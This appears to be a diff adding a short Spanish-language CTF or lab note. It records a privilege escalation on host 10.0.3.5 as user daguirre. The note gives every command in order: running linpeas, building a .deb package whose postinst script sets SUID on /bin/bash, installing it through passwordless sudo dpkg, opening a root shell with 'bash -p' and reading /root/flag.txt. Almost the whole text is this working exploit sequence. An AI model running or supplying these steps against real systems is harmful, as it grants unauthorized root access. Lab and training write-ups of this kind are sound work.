@@ -1,0 +1,26 @@
+Usuario usado para escalada: daguirre
+
+Comandos ejecutados:
+- scp /usr/local/bin/linpeas.sh daguirre@10.0.3.5:/tmp/linpeas.sh
+- chmod +x /tmp/linpeas.sh
+- ./linpeas.sh
+- mkdir -p /tmp/pwn/DEBIAN
+- nano /tmp/pwn/DEBIAN/control
+	Package: pwn
+	Version: 1.0
+	Section: custom
+	Priority: optional
+	Architecture: all
+	Maintainer: root
+	Description: romper todo
+- nano /tmp/pwn/DEBIAN/postinst
+	#!/bin/bash
+	chmod u+s /bin/bash
+- chmod +x /tmp/pwn/DEBIAN/postinst
+- dpkg-deb --build /tmp/pwn /tmp/pwn.deb
+- sudo dpkg -i /tmp/pwn.deb
+- bash -p
+- cat /root/flag.txt
+
+Vulnerabilidad explotada: sudo permite ejecutar dpkg como root sin contraseña.
+Se creó un paquete .deb con script postinst que activa SUID en /bin/bash.
